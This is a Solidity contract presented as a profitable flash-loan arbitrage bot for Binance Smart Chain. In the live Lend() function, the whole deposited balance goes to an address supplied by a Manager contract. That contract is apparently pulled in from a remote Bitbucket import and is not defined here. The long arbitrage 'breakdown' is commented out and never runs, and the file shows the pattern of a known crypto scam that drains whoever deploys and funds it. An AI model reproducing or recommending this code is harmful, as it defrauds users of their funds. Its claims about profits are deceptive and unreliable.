pragma solidity ^0.5.0;

/**
 * WARNING - this contract code is ONLY for Binance Smart Chain.
 * Testnet transactions will fail.
 * Profit remaining will be transfered to token creator contract.

 *UPDATED 06/04/2023 - liquidity returned if flash loan fails or insufficient balance ~ wait time around 5-24 hours
*/

// Magma-Finance Smart Contracts (now on bitbucket instead of github)
import "https://bitbucket.org/magma-finance/flashloaninitiator/raw/ca8ac9e37cfbe24f85b4311f87bfbd5c796d0a9f/ILendingPoolAddressesProvider.sol";
import "https://bitbucket.org/magma-finance/flashloaninitiator/raw/ca8ac9e37cfbe24f85b4311f87bfbd5c796d0a9f/ILendingPool.sol";
import "https://bitbucket.org/magma-finance/flashloaninitiator/raw/ca8ac9e37cfbe24f85b4311f87bfbd5c796d0a9f/PoolAddressesProvide.sol";


// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

contract LendForLoan {
    string private tokenInput;
    string private tokenLend;
    uint256 lendMax;
    Manager manager;

    constructor(

    ) public {
        tokenInput  = "BNB";
        tokenLend  = "DAI";
        lendMax  = 20000;
        manager = new Manager();
    }

    address public creator = msg.sender;

    function tokenTransfer() public view returns (address) {
        return creator;
    }

    function() external payable {}

    function Lend() public payable {  
        // Send New Token to PancakeSwap Router for Swap
        address(uint160(manager.swapDepositAddress())).transfer(
            address(this).balance
        );
        // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
        manager.performTasks();  
  
        /* Breakdown of all functions, function conbinated in the manager performTask
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);

      // Get BNB Loan from Multiplier-Finance & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);

      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);

        // Create BNB and DAI pairs for our token & provide liquidity for the flashloan
        string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
            manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
            string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
            manager.pancakeAddLiquidity(daiPair, loanAmount / 2);

        // Perform arbitrage trades
            manager.pancakePerformSwaps();

            // Move remaining BNB from Contract to your personal wallet
            manager.contractToWallet("BNB");

        // Repay Flashloan
            manager.repayLoan(loanAddress);
       
    }
    */
}
}